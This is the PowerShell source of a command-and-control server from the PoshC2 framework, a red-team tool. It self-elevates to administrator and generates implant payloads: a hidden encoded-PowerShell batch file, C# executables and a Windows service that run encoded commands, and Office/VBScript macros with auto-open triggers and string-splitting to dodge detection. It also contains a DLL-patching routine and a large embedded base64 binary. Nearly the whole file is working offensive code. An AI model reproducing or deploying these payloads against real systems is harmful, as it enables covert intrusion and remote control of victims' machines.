# Written by @benpturner and @davehardy20
function C2-Server {
Param($PoshPath, $RestartC2Server)

# are we running with Administrator privileges to open port 80
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator'))
{   
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process -FilePath powershell -Verb runAs -ArgumentList $arguments
    Break
}

Clear-Host
Write-Host -Object ""
Write-Host -Object "__________            .__.     _________  ________  "  -ForegroundColor Green
Write-Host -Object "\_______  \____  _____|  |__   \_   ___ \ \_____  \ "  -ForegroundColor Green
Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -ForegroundColor Green
Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
Write-Host "=============== v2.9 www.PoshC2.co.uk ==============" -ForegroundColor Green
Write-Host "====================================================" `n -ForegroundColor Green

if (!$RestartC2Server) {
    $PathExists = Test-Path $PoshPath

    if (!$PathExists) {
        $PoshPath = Read-Host "Cannot find the PowershellC2 directory, please specify path: "
    }
}

# if poshpath ends with slash then remove this

# tests for java JDK so we can create a Jar payload and applet
if (Test-Path "C:\program files\java\") {
    foreach ($folder in (get-childitem -name -path "C:\program files\java\"))
    {
        if ($folder.ToString().ToLower().StartsWith("jdk"))
        {
            $JDKPath = "C:\program files\java\$folder"
        }
    }
} else {
    Write-host "Cannot find any Java JDK versions Installed, Install Java JDK to create Java Applet Payloads" -ForegroundColor Red
}

$p = $env:PsModulePath
$p += ";$PoshPath"
[Environment]::SetEnvironmentVariable("PSModulePath",$p)
Import-Module -Name PSSQLite
$global:newdir = $null
$ipv4address = $null
$randomuriarray = @()
$taskiddb = 1 

# used to generate random uri for each implant
function Get-RandomURI 
{
    param (
        [int]$Length
    )
    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
    $result = ''
    for ($x = 0; $x -lt $Length; $x++) 
    {$result += $set | Get-Random}
    return $result
}

# creates a randon AES symetric encryption key
function Create-AesManagedObject 
{
    param
    (
        [Object]
        $key,
        [Object]
        $IV
    )

    $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) 
    {
        if ($IV.getType().Name -eq 'String') 
        {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
        else 
        {$aesManaged.IV = $IV}
    }
    if ($key) 
    {
        if ($key.getType().Name -eq 'String') 
        {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
        else 
        {$aesManaged.Key = $key}
    }
    $aesManaged
}

# creates a randon AES symetric encryption key
function Create-AesKey() 
{
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

# encryption utility using Rijndael encryption, an AES equivelant, returns encrypted bytes block 
function Encrypt-String2 
{
    param
    (
        [Object]
        $key,
        [Object]
        $unencryptedString
    )
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}

# decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted bytes block 
function Decrypt-String2 
{
    param
    (
        [Object]
        $key,
        [Object]
        $encryptedStringWithIV
    )
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}

# encryption utility using Rijndael encryption, an AES equivelant, returns encrypted base64 block 
function Encrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $unencryptedString
    )

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

# decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted UTF8 data
function Decrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $encryptedStringWithIV
    )
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

# download file function to convert from base64 in db to file
function Download-File
{
    param
    (
        [string] $SourceFilePath
    )
 
    $SourceFilePath = Resolve-PathSafe $SourceFilePath
    $bufferSize = 90000
    $buffer = New-Object byte[] $bufferSize
    $reader = [System.IO.File]::OpenRead($SourceFilePath)
    $base64 = $null
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
    } while ($bytesRead -eq $bufferSize);

    $base64
    $reader.Dispose()
}

# converts a source base64 file to file (need to change to IO.Memory Reader)
function ConvertFrom-Base64
{
    param
    (
        [string] $SourceFilePath,
        [string] $TargetFilePath
    )
 
    $SourceFilePath = Resolve-PathSafe $SourceFilePath
    $TargetFilePath = Resolve-PathSafe $TargetFilePath
    $bufferSize = 90000
    $buffer = New-Object char[] $bufferSize
    $reader = [System.IO.File]::OpenText($SourceFilePath)
    $writer = [System.IO.File]::OpenWrite($TargetFilePath)
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $bytes = [Convert]::FromBase64CharArray($buffer, 0, $bytesRead);
        $writer.Write($bytes, 0, $bytes.Length);
    } while ($bytesRead -eq $bufferSize);
     
    $reader.Dispose()
    $writer.Dispose()
}

# for resolving paths for file downloader
function Resolve-PathSafe
{
    param
    (
        [string] $Path
    )
      
    $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}

# create bat payloads
function CreatePayload 
{
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    [IO.File]::WriteAllLines("$global:newdir\payloads\payload.bat", $payload)

    Write-Host -Object "Batch Payload written to: $global:newdir\payloads\payload.bat"  -ForegroundColor Green
}

# create exe 
function CreateStandAloneExe 
{
$bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
$praw = [Convert]::ToBase64String($bytescom)
$csccode = 'using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;
        public Program() {
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
        public static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        
}
    
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Program.Main();       
    }
    public static string InvokeAutomation(string cmd)
    {
        Runspace newrunspace = RunspaceFactory.CreateRunspace();
        newrunspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
        Pipeline pipeline = newrunspace.CreatePipeline();

        pipeline.Commands.AddScript(cmd);
        Collection<PSObject> results = pipeline.Invoke();
        newrunspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
    }
}'
[IO.File]::WriteAllLines("$global:newdir\payloads\posh.cs", $csccode)

if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
    Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
} else {
    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
    }
}

}


# create service exe 
function CreateServiceExe 
{
$bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
$praw = [Convert]::ToBase64String($bytescom)
$cscservicecode = 'using System;
using System.Text;
using System.ServiceProcess;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace Service
{
    static class Program
    {
        static void Main()
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[]
            {
                new Service1()
            };
            ServiceBase.Run(ServicesToRun);
        }
    }
    public partial class Service1 : ServiceBase
    {
        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch (ArgumentException e)
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
        }

        protected override void OnStop()
        {
        }
    }
}'
[IO.File]::WriteAllLines("$global:newdir\payloads\posh-service.cs", $cscservicecode)

if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
    Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh-service.exe $global:newdir\payloads\posh-service.cs /reference:$PoshPath\System.Management.Automation.dll"
} else {
    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh-service.exe $global:newdir\payloads\posh-service.cs /reference:$PoshPath\System.Management.Automation.dll"
    }
}

}

function PatchDll {
    param($dllBytes, $replaceString, $Arch)

    if ($Arch -eq 'x86') {
        $dllOffset = 0x00003640
        $dllOffset = $dllOffset +8
    }
    if ($Arch -eq 'x64') {
        $dllOffset = 0x00004470
    }

    # Patch DLL - replace 5000 A's
    $AAAA = "A"*5000
    $AAAABytes = ([System.Text.Encoding]::UNICODE).GetBytes($AAAA)
    $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
    
    # Length of replacement code
    $dllLength = $replaceString.Length
    $patchLength = 5000 -$dllLength
    $nullString = 0x00*$patchLength
    $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
    $nullBytes = $nullBytes[1..$patchLength]
    $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)

    $dllLength = 10000 -3
    $i=0
    # Loop through each byte from start position
    $dllOffset..($dllOffset + $dllLength) | % {
        $dllBytes[$_] = $replaceNewStringBytes[$i]
        $i++
    }
    
    # Return Patched DLL
    return $DllBytes
}

# create macro payloads
function CreateMacroPayload 
{
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = [Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    $payloadbits = $null
    While ($payload)
    { 
        $y = $payload[0..500] -join ''
        $payload = $payload -replace $y,''
        $payloadbits = $payloadbits +'str = str + "'+$y+'"'+"`r`n"
    }

    $macro = 'Sub Auto_Open()
UpdateMacro
End Sub

Sub AutoOpen()
UpdateMacro
End Sub

Sub Workbook_Open()
UpdateMacro
End Sub

Sub WorkbookOpen()
UpdateMacro
End Sub

Sub Document_Open()
UpdateMacro
End Sub

Sub DocumentOpen()
UpdateMacro
End Sub

Sub UpdateMacro()
Dim str, exec, wsh

str = ""
'+$payloadbits+'
exec = "p"
exec = exec + "o"
exec = exec + "w"
exec = exec + "e"
exec = exec + "r"
exec = exec + "s"
exec = exec + "h"
exec = exec + "e"
exec = exec + "l"
exec = exec + "l"
exec = exec + "."
exec = exec + "e"
exec = exec + "x"
exec = exec + "e"
exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str
'

$macrodoc = $macro + '
Shell(exec)
End Sub'

$wscript = $macro + '
Set wsh = CreateObject( "WScript.Shell" )
wsh.Exec(exec)
End Sub

UpdateMacro'

    [IO.File]::WriteAllLines("$global:newdir\payloads\macro.txt", $macrodoc)
    [IO.File]::WriteAllLines("$global:newdir\payloads\wscript.vbs", $wscript)
    try {
    Write-Host -Object "Macro Payload written to: $global:newdir\payloads\macro.txt"  -ForegroundColor Green
    Write-Host -Object "Wscript Payload written to: $global:newdir\payloads\wscript.vbs"  -ForegroundColor Green
    Write-Host -Object "Exe Payload written to: $global:newdir\payloads\posh.exe"  -ForegroundColor Green
    Write-Host -Object "Service-Exe Payload written to: $global:newdir\payloads\posh-service.exe"  -ForegroundColor Green

    Import-Module $PoshPath\Modules\ConvertTo-Shellcode.ps1
    $86="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